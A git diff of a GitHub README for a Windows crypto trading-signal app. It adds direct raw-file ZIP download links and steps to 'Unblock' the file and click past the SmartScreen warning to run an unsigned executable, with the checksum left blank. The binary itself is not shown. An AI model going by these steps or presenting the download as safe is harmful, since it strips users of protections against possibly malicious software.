@@ -11,7 +11,9 @@
 
 **No account. No API keys. No access to your funds.**
 
-[📥 Download](#-installation) • [💰 Pricing](#-pricing) • [✨ Features](#-features) • [❓ FAQ](#-faq) • [🔒 Security](#-security--privacy) • [💬 Support](#-support)
+### [⬇️ Download v5.5.0 (ZIP)](https://github.com/cryptosignalc-cloud/cryptosignal-pro/raw/main/CryptoSignal_PRO_v5.5.0.zip)
+
+[💰 Pricing](#-pricing) • [✨ Features](#-features) • [❓ FAQ](#-faq) • [🔒 Security](#-security--privacy) • [💬 Support](#-support)
 
 </div>
 
@@ -19,8 +21,10 @@
 
 ## 📸 Screenshot
 
-<img width="1357" height="657" alt="image" src="https://github.com/user-attachments/assets/c9d8eee2-486e-43a7-827c-a8d6722cc5f7" />
+<img width="1349" height="658" alt="image" src="https://github.com/user-attachments/assets/6fed722b-8090-42e1-af7c-681b1d0d9f0f" />
 
+
+_Main dashboard: 20+ pairs scanned in real time with ADX, RSI, MACD, POC, and confluence scoring._
 
 ---
 
@@ -59,6 +63,40 @@ No credit card required for the trial. Payment for PRO is processed through a se
 
 ---
 
+## 📥 Download & Installation
+
+### Direct download
+
+**➡️ [CryptoSignal_PRO_v5.5.0.zip](https://github.com/cryptosignalc-cloud/cryptosignal-pro/raw/main/CryptoSignal_PRO_v5.5.0.zip)**
+
+SHA-256 checksum: _(add after generating — see note below)_
+
+### System Requirements
+| | Minimum | Recommended |
+|---|---|---|
+| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
+| RAM | 4 GB | 8 GB |
+| Disk | 500 MB | 500 MB |
+| Network | Stable connection | Wired / low-latency |
+
+### Installation Steps
+
+1. [Download the ZIP archive](https://github.com/cryptosignalc-cloud/cryptosignal-pro/raw/main/CryptoSignal_PRO_v5.5.0.zip)
+2. Right-click the downloaded file → **Properties** → check **Unblock** → Apply _(Windows security step)_
+3. Extract the archive to a folder of your choice (e.g. `C:\CryptoSignalPRO\`)
+4. Run `CryptoSignal.exe`
+5. Your 150-hour free trial starts on first launch
+
+> ⚠️ **SmartScreen warning:** This beta is not yet code-signed. Windows may show _"Windows protected your PC"_. Click **More info → Run anyway**. A signed release is planned for v5.6.
+>
+> If you prefer not to run unsigned binaries, wait for the signed release — that's a reasonable choice.
+
+### Alternative: Releases page
+
+You can also download from the [Releases page](https://github.com/cryptosignalc-cloud/cryptosignal-pro/releases), where future versions and changelogs will be published.
+
+---
+
 ## ✨ Features
 
 ### 📊 Technical Analysis
@@ -92,30 +130,6 @@ No credit card required for the trial. Payment for PRO is processed through a se
 - P&L and Win Rate calculation on your own entries
 - CSV and JSON export for your own analysis
 - Stored locally only — never uploaded
-
----
-
-## 📥 Installation
-
-### System Requirements
-| | Minimum | Recommended |
-|---|---|---|
-| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| RAM | 4 GB | 8 GB |
-| Disk | 50 MB | 50 MB |
-| Network | Stable connection | Wired / low-latency |
-
-### Installing the Beta
-
-1. Go to **[Releases](../../releases)**
-2. Download `CryptoSignalPRO_Setup_v5.5.0.zip`
-3. Run the installer and follow the wizard
-4. Launch from Start Menu → CryptoSignal PRO
-5. Your 150-hour free trial starts on first launch
-
-> ⚠️ **SmartScreen warning:** This beta is not yet code-signed. Windows will show _"Windows protected your PC"_. Click **More info → Run anyway**. A signed release is planned for v5.6.
->
-> If you prefer not to run unsigned binaries, wait for the signed release — that's a reasonable choice.
 
 ---
 
@@ -200,13 +214,13 @@ This software is provided "AS IS" without warranty of any kind. The author accep
 
 ## 🐞 Known Issues (v5.5.0 beta)
 
-- SmartScreen warning on first launch (see [Installation](#-installation))
+- SmartScreen warning on first launch (see [Installation](#-download--installation))
 - Economic calendar may show events in UTC regardless of local timezone setting
 - Rare WebSocket reconnect stall after network change — restart the app
 - Multi-monitor DPI scaling imperfect on mixed-DPI setups
 - Trial counter resets if system clock is changed (will be fixed in v5.6)
 
-Please report new issues at [GitHub Issues](../../issues) with your Windows version and a log snippet from `%APPDATA%\CryptoSignalPRO\logs\`.
+Please report new issues at [GitHub Issues](https://github.com/cryptosignalc-cloud/cryptosignal-pro/issues) with your Windows version and a log snippet from `%APPDATA%\CryptoSignalPRO\logs\`.
 
 ---
 
@@ -232,8 +246,8 @@ Proprietary license — see [LICENSE.txt](LICENSE.txt).
 ## 💬 Support & Contact
 
 - **Email:** cryptosignalc@gmail.com
-- **Bug reports:** [GitHub Issues](../../issues) _(preferred)_
-- **Feature requests:** [GitHub Discussions](../../discussions)
+- **Bug reports:** [GitHub Issues](https://github.com/cryptosignalc-cloud/cryptosignal-pro/issues) _(preferred)_
+- **Feature requests:** [GitHub Discussions](https://github.com/cryptosignalc-cloud/cryptosignal-pro/discussions)
 - **Telegram channel:** _(coming soon)_
 
 Response time: typically within 48 hours on weekdays.
@@ -244,5 +258,7 @@ Response time: typically within 48 hours on weekdays.
 
 **CryptoSignal PRO** — built in 🇨🇿 Czech Republic  
 © 2024–2026 · All rights reserved
+
+[⬇️ Download v5.5.0](https://github.com/cryptosignalc-cloud/cryptosignal-pro/raw/main/CryptoSignal_PRO_v5.5.0.zip)
 
 </div>
